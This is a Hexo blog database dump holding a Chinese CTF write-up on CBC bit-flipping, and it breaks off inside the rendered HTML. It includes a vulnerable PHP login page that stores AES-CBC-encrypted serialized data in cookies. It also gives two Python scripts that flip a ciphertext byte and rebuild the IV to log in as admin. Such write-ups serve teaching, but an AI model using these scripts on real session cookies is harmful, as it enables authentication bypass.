id":"public/archives/2018/page/4/index.html","hash":"1a28b58ec77c20b417a5fe61d09726d36d44bddc","modified":1533560004540},{"_id":"public/archives/2018/03/index.html","hash":"6105f7a40ad98a9a6c26e81f2d242a745bea696c","modified":1533560004540},{"_id":"public/archives/2018/04/index.html","hash":"3eee8dbfe606ab58d39cf64dfc0dea37b84fb9d1","modified":1533560004540},{"_id":"public/archives/2018/05/index.html","hash":"f20eb0c6db352f0aed4ae8a3195edf9cec3b3b69","modified":1533560004540},{"_id":"public/archives/2018/06/index.html","hash":"bc40922c9dd83ab25a65170d232f36f865a69a64","modified":1533560004540},{"_id":"public/archives/2018/06/page/2/index.html","hash":"9a50f7adbdb979df7ec29075e0f96b41cd74bdde","modified":1533560004540},{"_id":"public/archives/2018/07/index.html","hash":"e12aa83ac5a8076c42ea2aea5eb38bde9e31e8a9","modified":1533560004540},{"_id":"public/archives/2018/08/index.html","hash":"54effbd7dca81fbbb1c0710ce26a960cb17f1916","modified":1533560004540},{"_id":"public/index.html","hash":"6826114cbf3376a5daad59b4e1d3f8334aebd376","modified":1533560004540},{"_id":"public/page/2/index.html","hash":"e9e668c872a785d5e47e1ac707017418be8c3dc4","modified":1533560004540},{"_id":"public/page/3/index.html","hash":"cd02e2b72dcd91da39c0a4548848c21a6005b7e6","modified":1533560004540},{"_id":"public/page/4/index.html","hash":"6fad368779304a310f0d75cc7e804bf65e6cda37","modified":1533560004540},{"_id":"public/tags/web安全/index.html","hash":"5b9131be2f9fdf5a88341ffbf79f907567b68f47","modified":1533560004541},{"_id":"public/tags/pwn/index.html","hash":"8d9d8ebed338fd899f4de7faa646d61220a4a1bb","modified":1533560004541},{"_id":"public/tags/ctf/index.html","hash":"e50b77bcef7c7f9c3ead14b2330eca2d7d80f1ef","modified":1533560004541},{"_id":"public/tags/ctf/page/2/index.html","hash":"ac7d8816ea08b968217275e102ecc13538d411e5","modified":1533560004541},{"_id":"public/tags/工具手册/index.html","hash":"1fd70e7dac13477829d2a56c0b38f3aa6d175bc1","modified":1533560004541},{"_id":"public/tags/mysql/index.html","hash":"0669b652f55ef809ce7a2ba5cd90e309168fb07e","modified":1533560004541},{"_id":"public/tags/web/index.html","hash":"16dd87ef46b1a4c0af2a742b055666e2d4cb54dc","modified":1533560004541},{"_id":"public/tags/python/index.html","hash":"f9c4dca0735dbf59927c9213424acd05533e292c","modified":1533560004541},{"_id":"public/tags/安全/index.html","hash":"a948abbeedf3fcbac8ef5dcc7c5012f426c60c23","modified":1533560004541},{"_id":"public/tags/sql注入/index.html","hash":"a948abbeedf3fcbac8ef5dcc7c5012f426c60c23","modified":1533560004542},{"_id":"public/tags/前端/index.html","hash":"6d8fada162daef6cbc6c86610b5fadd5c4e06628","modified":1533560004542},{"_id":"public/assets/algolia_logo.svg","hash":"16505f61f19ba65f629dfd033f14ee9abcf18756","modified":1533560004552},{"_id":"public/assets/favicon.ico","hash":"8b200c575d273d41a179c102442e191414e74eae","modified":1533560004552},{"_id":"public/assets/loading.svg","hash":"85082b002bae1335114b71550350907884187e38","modified":1533560004553},{"_id":"public/assets/example_qr.png","hash":"cce20432c34875f4d9c6df927ede0fc0f00bb194","modified":1533560004553},{"_id":"public/avatar/Misaka.jpg","hash":"74a0372523f98dfbba992bf80642e160d04dc9b1","modified":1533560004553},{"_id":"public/font/Source Sans Pro.woff","hash":"a6722c9b6439b7a020a9be3d3178970757a9265c","modified":1533560004553},{"_id":"public/font/Source Sans Pro.woff2","hash":"da65f527a8da65d5eb6721626d28cfdb46ab104a","modified":1533560004553},{"_id":"public/intro/404-bg.jpg","hash":"3afb5bb26f4ff0bd0e0a28df955c8aa7d746d3c5","modified":1533560004556},{"_id":"public/font/Oswald-Regular.ttf","hash":"965d729546a43a8490ad4cf33c25ac475682100c","modified":1533560004560},{"_id":"public/font/SourceCodePro-Regular.ttf.woff2","hash":"f5991289ec17884cb641da0646d278d36702a190","modified":1533560004560},{"_id":"public/font/SourceCodePro-Regular.ttf.woff","hash":"12eef75e1ad3eca9dae42b65505010ce4464a315","modified":1533560004560},{"_id":"public/css/mobile.css","hash":"a52f4801fa1134caf783cd3a79a130b4cf8aa5d3","modified":1533560004566},{"_id":"public/scripts/search.js","hash":"d5f739e261e8ce74f993c6157b248663bda122bf","modified":1533560004566},{"_id":"public/lib/webfontloader.min.js","hash":"bc6ffe9c0d8b3285564619a445c6ca575eb9d0f5","modified":1533560004566},{"_id":"public/css/style.css","hash":"e523b75de9bb75e8a106c5b0fa6992826bb28a3c","modified":1533560004566},{"_id":"public/scripts/share.js","hash":"bb5bb37ce7f47f8c084b232df3e5fe2378d7ca01","modified":1533560004566},{"_id":"public/scripts/main.js","hash":"cde31e8850e6c2e854f1eef2bc49769a9c5f6290","modified":1533560004566},{"_id":"public/lib/jquery.min.js","hash":"0dc32db4aa9c5f03f3b38c47d883dbd4fed13aae","modified":1533560004566},{"_id":"public/intro/about-bg.jpg","hash":"ab388276822417cc4e703312c14e20280ec783b3","modified":1533560004604},{"_id":"public/intro/post-bg.jpg","hash":"525fafb2238c27754d8fa751f143ff1de9b8482d","modified":1533560004604},{"_id":"public/intro/index-bg.jpg","hash":"96b52e177b8bc53e64ec6ee1e10b2b6a4e13083b","modified":1533560004612}],"Category":[{"name":"安全","_id":"cjkia12ii001nqkdlpkq8ls67"},{"name":"sql注入","parent":"cjkia12ii001nqkdlpkq8ls67","_id":"cjkia12is001wqkdlf27gk6ed"}],"Data":[],"Page":[],"Post":[{"title":"cbc翻转","date":"2018-05-08T07:50:54.000Z","_content":"\n# CBC翻转攻击\n\n参考链接:\n\n1. https://blog.csdn.net/csu_vc/article/details/79619309\n2. http://wooyun.jozxing.cc/static/drops/tips-7828.html\n\n```php\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">;\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<title>Login Form</title>\n<link href=\"static/css/style.css\" rel=\"stylesheet\" type=\"text/css\" />\n<script type=\"text/javascript\" src=\"static/js/jquery.min.js\"></script>\n<script type=\"text/javascript\">\n$(document).ready(function() {\n    $(\".username\").focus(function() {\n        $(\".user-icon\").css(\"left\",\"-48px\");\n    });\n    $(\".username\").blur(function() {\n        $(\".user-icon\").css(\"left\",\"0px\");\n    });\n    $(\".password\").focus(function() {\n        $(\".pass-icon\").css(\"left\",\"-48px\");\n    });\n    $(\".password\").blur(function() {\n        $(\".pass-icon\").css(\"left\",\"0px\");\n    });\n});\n</script>\n</head>\n<?php\ndefine(\"SECRET_KEY\", file_get_contents('/root/key'));\ndefine(\"METHOD\", \"aes-128-cbc\");\nsession_start();\nfunction get_random_iv(){\n    $random_iv='';\n    for($i=0;$i<16;$i++){\n        $random_iv.=chr(rand(1,255));\n    }\n    return $random_iv;\n}\nfunction login($info){\n    $iv = get_random_iv();\n    $plain = serialize($info);\n    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);\n    $_SESSION['username'] = $info['username'];\n    setcookie(\"iv\", base64_encode($iv));\n    setcookie(\"cipher\", base64_encode($cipher));\n}\nfunction check_login(){\n    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){\n        $cipher = base64_decode($_COOKIE['cipher']);\n        $iv = base64_decode($_COOKIE[\"iv\"]);\n        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){\n            $info = unserialize($plain) or die(\"<p>base64_decode('\".base64_encode($plain).\"') can't unserialize</p>\");\n            $_SESSION['username'] = $info['username'];\n        }else{\n            die(\"ERROR!\");\n        }\n    }\n}\nfunction show_homepage(){\n    if ($_SESSION[\"username\"]==='admin'){\n        echo '<p>Hello admin</p>';\n        echo '<p>Flag is $flag</p>';\n    }else{\n        echo '<p>hello '.$_SESSION['username'].'</p>';\n        echo '<p>Only admin can see flag</p>';\n    }\n    echo '<p><a href=\"loginout.php\">Log out</a></p>';\n}\nif(isset($_POST['username']) && isset($_POST['password'])){\n    $username = (string)$_POST['username'];\n    $password = (string)$_POST['password'];\n    if($username === 'admin'){\n        exit('<p>admin are not allowed to login</p>');\n    }else{\n        $info = array('username'=>$username,'password'=>$password);\n        login($info);\n        show_homepage();\n    }\n}else{\n    if(isset($_SESSION[\"username\"])){\n        check_login();\n        show_homepage();\n    }else{\n        echo '<body class=\"login-body\">\n                <div id=\"wrapper\">\n                    <div class=\"user-icon\"></div>\n                    <div class=\"pass-icon\"></div>\n                    <form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\">\n                        <div class=\"header\">\n                        <h1>Login Form</h1>\n                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>\n                        </div>\n                        <div class=\"content\">\n                        <input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" />\n                        <input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" />\n                        </div>\n                        <div class=\"footer\">\n                        <input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" />\n                        </div>\n                    </form>\n                </div>\n            </body>';\n    }\n}\n?>\n</html>\n```\n\n首先确定解密后的字符串:\n\n> a:2:{s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"}\n\n第一步: 替换cookie中的cipher为反转后的cipher.\n\n```python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Date    : 2018-03-15 11:45:57\n# @Author  : Mr.zhang(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\n# username='zdmin'\nimport base64\nimport requests\nimport urllib\niv_raw='DbVDXiIkUNkqwCARqqpYew%3D%3D'  #这里填写第一次返回的iv值\ncipher_raw='27cekPxVgR5hbiu6ay%2BUfSmepzwYYL%2FTdbN1K3kmrH2EJ%2FqvBtAdKGGqGytHgJXJzNB26ZRX5dwupd885R%2Bwng%3D%3D'  #这里填写第一次返回的cipher值\nprint \"[*]原始iv和cipher\"\nprint \"iv_raw:  \" + iv_raw\nprint \"cipher_raw:  \" + cipher_raw\nprint \"[*]对cipher解码，进行反转\"\ncipher = base64.b64decode(urllib.unquote(cipher_raw))\n#a:2:{s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"}\n#s:2:{s:8:\"userna\n#me\";s:5:\"zdmin\";\n#s:8:\"password\";s\n#:3:\"12345\";}\nxor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord('z') ^ ord('a')) + cipher[10:]  #请根据你的输入自行更改，原理看上面的介绍\nxor_cipher=urllib.quote(base64.b64encode(xor_cipher))\nprint \"反转后的cipher：\" + xor_cipher\n```\n\n第二步: 第一步执行完，得到一个base64之后的字符串，代入下边的脚本，然后替换cookie中的iv为以下脚本输出的新的iv值。\n\n```python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Date    : 2018-03-15 11:56:20\n# @Author  : csu_vc(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\nimport base64\nimport urllib\ncipher = 't8hxonGnYZs19dVMEzqeZm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'#填写提交后所得的无法反序列化密文\niv = 'DbVDXiIkUNkqwCARqqpYew%3D%3D'#一开始提交的iv\ncipher = urllib.unquote(cipher)\ncipher = base64.b64decode(cipher)\niv = base64.b64decode(urllib.unquote(iv))\nnewIv = ''\nright = 'a:2:{s:8:\"userna'#被损坏前正确的明文\nfor i in range(16):\n    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #这一步相当于把原来iv中不匹配的部分修改过来\nprint urllib.quote(base64.b64encode(newIv))\n```\n\n\n\n","source":"_posts/cbc翻转.md","raw":"---\ntitle: cbc翻转\ndate: 2018-05-08 15:50:54\ntags: web安全\n---\n\n# CBC翻转攻击\n\n参考链接:\n\n1. https://blog.csdn.net/csu_vc/article/details/79619309\n2. http://wooyun.jozxing.cc/static/drops/tips-7828.html\n\n```php\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">;\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<title>Login Form</title>\n<link href=\"static/css/style.css\" rel=\"stylesheet\" type=\"text/css\" />\n<script type=\"text/javascript\" src=\"static/js/jquery.min.js\"></script>\n<script type=\"text/javascript\">\n$(document).ready(function() {\n    $(\".username\").focus(function() {\n        $(\".user-icon\").css(\"left\",\"-48px\");\n    });\n    $(\".username\").blur(function() {\n        $(\".user-icon\").css(\"left\",\"0px\");\n    });\n    $(\".password\").focus(function() {\n        $(\".pass-icon\").css(\"left\",\"-48px\");\n    });\n    $(\".password\").blur(function() {\n        $(\".pass-icon\").css(\"left\",\"0px\");\n    });\n});\n</script>\n</head>\n<?php\ndefine(\"SECRET_KEY\", file_get_contents('/root/key'));\ndefine(\"METHOD\", \"aes-128-cbc\");\nsession_start();\nfunction get_random_iv(){\n    $random_iv='';\n    for($i=0;$i<16;$i++){\n        $random_iv.=chr(rand(1,255));\n    }\n    return $random_iv;\n}\nfunction login($info){\n    $iv = get_random_iv();\n    $plain = serialize($info);\n    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);\n    $_SESSION['username'] = $info['username'];\n    setcookie(\"iv\", base64_encode($iv));\n    setcookie(\"cipher\", base64_encode($cipher));\n}\nfunction check_login(){\n    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){\n        $cipher = base64_decode($_COOKIE['cipher']);\n        $iv = base64_decode($_COOKIE[\"iv\"]);\n        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){\n            $info = unserialize($plain) or die(\"<p>base64_decode('\".base64_encode($plain).\"') can't unserialize</p>\");\n            $_SESSION['username'] = $info['username'];\n        }else{\n            die(\"ERROR!\");\n        }\n    }\n}\nfunction show_homepage(){\n    if ($_SESSION[\"username\"]==='admin'){\n        echo '<p>Hello admin</p>';\n        echo '<p>Flag is $flag</p>';\n    }else{\n        echo '<p>hello '.$_SESSION['username'].'</p>';\n        echo '<p>Only admin can see flag</p>';\n    }\n    echo '<p><a href=\"loginout.php\">Log out</a></p>';\n}\nif(isset($_POST['username']) && isset($_POST['password'])){\n    $username = (string)$_POST['username'];\n    $password = (string)$_POST['password'];\n    if($username === 'admin'){\n        exit('<p>admin are not allowed to login</p>');\n    }else{\n        $info = array('username'=>$username,'password'=>$password);\n        login($info);\n        show_homepage();\n    }\n}else{\n    if(isset($_SESSION[\"username\"])){\n        check_login();\n        show_homepage();\n    }else{\n        echo '<body class=\"login-body\">\n                <div id=\"wrapper\">\n                    <div class=\"user-icon\"></div>\n                    <div class=\"pass-icon\"></div>\n                    <form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\">\n                        <div class=\"header\">\n                        <h1>Login Form</h1>\n                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>\n                        </div>\n                        <div class=\"content\">\n                        <input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" />\n                        <input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" />\n                        </div>\n                        <div class=\"footer\">\n                        <input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" />\n                        </div>\n                    </form>\n                </div>\n            </body>';\n    }\n}\n?>\n</html>\n```\n\n首先确定解密后的字符串:\n\n> a:2:{s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"}\n\n第一步: 替换cookie中的cipher为反转后的cipher.\n\n```python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Date    : 2018-03-15 11:45:57\n# @Author  : Mr.zhang(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\n# username='zdmin'\nimport base64\nimport requests\nimport urllib\niv_raw='DbVDXiIkUNkqwCARqqpYew%3D%3D'  #这里填写第一次返回的iv值\ncipher_raw='27cekPxVgR5hbiu6ay%2BUfSmepzwYYL%2FTdbN1K3kmrH2EJ%2FqvBtAdKGGqGytHgJXJzNB26ZRX5dwupd885R%2Bwng%3D%3D'  #这里填写第一次返回的cipher值\nprint \"[*]原始iv和cipher\"\nprint \"iv_raw:  \" + iv_raw\nprint \"cipher_raw:  \" + cipher_raw\nprint \"[*]对cipher解码，进行反转\"\ncipher = base64.b64decode(urllib.unquote(cipher_raw))\n#a:2:{s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"}\n#s:2:{s:8:\"userna\n#me\";s:5:\"zdmin\";\n#s:8:\"password\";s\n#:3:\"12345\";}\nxor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord('z') ^ ord('a')) + cipher[10:]  #请根据你的输入自行更改，原理看上面的介绍\nxor_cipher=urllib.quote(base64.b64encode(xor_cipher))\nprint \"反转后的cipher：\" + xor_cipher\n```\n\n第二步: 第一步执行完，得到一个base64之后的字符串，代入下边的脚本，然后替换cookie中的iv为以下脚本输出的新的iv值。\n\n```python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Date    : 2018-03-15 11:56:20\n# @Author  : csu_vc(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\nimport base64\nimport urllib\ncipher = 't8hxonGnYZs19dVMEzqeZm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'#填写提交后所得的无法反序列化密文\niv = 'DbVDXiIkUNkqwCARqqpYew%3D%3D'#一开始提交的iv\ncipher = urllib.unquote(cipher)\ncipher = base64.b64decode(cipher)\niv = base64.b64decode(urllib.unquote(iv))\nnewIv = ''\nright = 'a:2:{s:8:\"userna'#被损坏前正确的明文\nfor i in range(16):\n    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #这一步相当于把原来iv中不匹配的部分修改过来\nprint urllib.quote(base64.b64encode(newIv))\n```\n\n\n\n","slug":"cbc翻转","published":1,"updated":"2018-06-25T12:00:14.716Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12g30000qkdlxpcijkmr","content":"<h1 id=\"CBC翻转攻击\"><a href=\"#CBC翻转攻击\" class=\"headerlink\" title=\"CBC翻转攻击\"></a>CBC翻转攻击</h1><p>参考链接:</p>\n<ol>\n<li><a href=\"https://blog.csdn.net/csu_vc/article/details/79619309\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/csu_vc/article/details/79619309</a></li>\n<li><a href=\"http://wooyun.jozxing.cc/static/drops/tips-7828.html\" target=\"_blank\" rel=\"noopener\">http://wooyun.jozxing.cc/static/drops/tips-7828.html</a></li>\n</ol>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html <span class=\"keyword\">PUBLIC</span> <span class=\"string\">\"-//W3C//DTD XHTML 1.0 Transitional//EN\"</span> <span class=\"string\">\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"</span>&gt;;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta http-equiv=<span class=\"string\">\"Content-Type\"</span> content=<span class=\"string\">\"text/html; charset=utf-8\"</span> /&gt;</span><br><span class=\"line\">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class=\"line\">&lt;link href=<span class=\"string\">\"static/css/style.css\"</span> rel=<span class=\"string\">\"stylesheet\"</span> type=<span class=\"string\">\"text/css\"</span> /&gt;</span><br><span class=\"line\">&lt;script type=<span class=\"string\">\"text/javascript\"</span> src=<span class=\"string\">\"static/js/jquery.min.js\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script type=<span class=\"string\">\"text/javascript\"</span>&gt;</span><br><span class=\"line\">$(document).ready(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    $(<span class=\"string\">\".username\"</span>).focus(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $(<span class=\"string\">\".user-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"-48px\"</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    $(<span class=\"string\">\".username\"</span>).blur(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $(<span class=\"string\">\".user-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"0px\"</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    $(<span class=\"string\">\".password\"</span>).focus(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $(<span class=\"string\">\".pass-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"-48px\"</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    $(<span class=\"string\">\".password\"</span>).blur(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $(<span class=\"string\">\".pass-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"0px\"</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">define(<span class=\"string\">\"SECRET_KEY\"</span>, file_get_contents(<span class=\"string\">'/root/key'</span>));</span><br><span class=\"line\">define(<span class=\"string\">\"METHOD\"</span>, <span class=\"string\">\"aes-128-cbc\"</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_random_iv</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    $random_iv=<span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;<span class=\"number\">16</span>;$i++)&#123;</span><br><span class=\"line\">        $random_iv.=chr(rand(<span class=\"number\">1</span>,<span class=\"number\">255</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $random_iv;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($info)</span></span>&#123;</span><br><span class=\"line\">    $iv = get_random_iv();</span><br><span class=\"line\">    $plain = serialize($info);</span><br><span class=\"line\">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">'username'</span>] = $info[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    setcookie(<span class=\"string\">\"iv\"</span>, base64_encode($iv));</span><br><span class=\"line\">    setcookie(<span class=\"string\">\"cipher\"</span>, base64_encode($cipher));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_login</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">'cipher'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">'iv'</span>]))&#123;</span><br><span class=\"line\">        $cipher = base64_decode($_COOKIE[<span class=\"string\">'cipher'</span>]);</span><br><span class=\"line\">        $iv = base64_decode($_COOKIE[<span class=\"string\">\"iv\"</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class=\"line\">            $info = unserialize($plain) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">\"&lt;p&gt;base64_decode('\"</span>.base64_encode($plain).<span class=\"string\">\"') can't unserialize&lt;/p&gt;\"</span>);</span><br><span class=\"line\">            $_SESSION[<span class=\"string\">'username'</span>] = $info[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"ERROR!\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show_homepage</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_SESSION[<span class=\"string\">\"username\"</span>]===<span class=\"string\">'admin'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;hello '</span>.$_SESSION[<span class=\"string\">'username'</span>].<span class=\"string\">'&lt;/p&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;&lt;a href=\"loginout.php\"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'username'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>]))&#123;</span><br><span class=\"line\">    $username = (string)$_POST[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    $password = (string)$_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($username === <span class=\"string\">'admin'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $info = <span class=\"keyword\">array</span>(<span 